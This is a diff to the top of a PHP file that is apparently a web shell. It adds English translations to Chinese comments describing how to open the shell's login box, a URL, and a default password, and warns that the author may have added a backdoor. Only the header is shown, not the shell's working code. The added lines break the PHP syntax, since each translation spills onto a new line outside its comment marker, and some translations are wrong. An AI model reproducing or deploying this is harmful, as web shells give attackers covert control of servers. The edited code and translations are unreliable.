@@ -2,9 +2,12 @@
 session_start();
 ini_set('memory_limit',-1);
 //**********************************
-//不保证作者加后门
-//请自行甄别
-//使用方法：打开shell地址后按“p”键，之后会出现登录框
+//不保证作者加后门 (
+Does not guarantee the author plus back door)
+//请自行甄别 (
+Please identify yourself)
+//使用方法：打开shell地址后按“p”键，之后会出现登录框 (
+How to use: Open the shell address and press the "p" key. The login box will appear.)
 //http://require.duapp.com/session.php
 //**********************************
 //自定义密码 不设置默认密码为demo
